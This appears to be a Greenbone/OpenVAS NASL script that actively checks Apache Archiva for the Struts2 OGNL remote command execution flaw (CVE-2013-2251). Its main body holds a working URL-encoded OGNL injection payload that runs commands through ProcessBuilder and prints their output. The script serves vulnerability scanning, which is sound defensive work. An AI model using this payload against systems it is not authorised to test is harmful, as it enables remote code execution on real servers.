# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:apache:archiva";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103883");
  script_version("2024-11-05T05:05:33+0000");
  script_tag(name:"creation_date", value:"2014-01-15 18:13:42 +0100 (Wed, 15 Jan 2014)");
  script_tag(name:"last_modification", value:"2024-11-05 05:05:33 +0000 (Tue, 05 Nov 2024)");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2024-07-16 17:57:08 +0000 (Tue, 16 Jul 2024)");

  script_cve_id("CVE-2013-2251");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_vul");

  script_name("Apache Archiva <= 1.3.6 Multiple RCE Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("gb_apache_archiva_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 443);
  script_mandatory_keys("apache/archiva/http/detected");

  script_tag(name:"summary", value:"Apache Archiva is prone to multiple remote command execution
  (RCE) vulnerabilities in Apache Struts2.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Apache Archiva use Apache Struts2:

  In Struts 2 before 2.3.15.1 the information following 'action:', 'redirect:' or 'redirectAction:'
  is not properly sanitized. Since said information will be evaluated as OGNL expression against the
  value stack, this introduces the possibility to inject server side code.");

  script_tag(name:"impact", value:"Successful exploits will allow remote attackers to execute
  arbitrary commands within the context of the affected application.");

  script_tag(name:"affected", value:"Apache Archiva version 1.3.6 and prior is known to be
  affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_xref(name:"URL", value:"http://cxsecurity.com/issue/WLB-2014010087");
  script_xref(name:"URL", value:"http://struts.apache.org/release/2.3.x/docs/s2-016.html");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

cmds = exploit_commands();

foreach cmd( keys( cmds ) ) {
  url = dir +
        '/security/login.action?redirect:' +
        '${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{%27' +
        cmds[cmd] +
        '%27})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b)' +
        ',%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23' +
        'matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23' +
        'matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}';

  if( buf = http_vuln_check( port:port, url:url, pattern:cmd, bodyonly:TRUE ) ) {
    buf = str_replace( string:buf, find:raw_string( 0x00 ), replace:"" );
    report = http_report_vuln_url( port:port, url:url );
    report += '\n\nIt was possible to execute the command "' + cmds[cmd] + '" on the remote host which produces the following output:\n\n' + buf;
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
